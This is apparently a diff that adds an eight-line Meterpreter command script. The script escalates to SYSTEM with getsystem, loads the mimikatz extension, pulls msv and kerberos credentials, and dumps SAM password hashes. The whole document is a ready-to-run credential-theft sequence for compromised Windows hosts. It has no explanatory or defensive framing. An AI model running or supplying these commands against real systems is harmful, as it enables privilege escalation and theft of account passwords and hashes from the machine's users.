@@ -1,0 +1,8 @@
+getuid
+getsystem
+getuid
+sysinfo
+load mimikatz
+msv
+kerberos
+mimikatz_command -f samdump::hashes
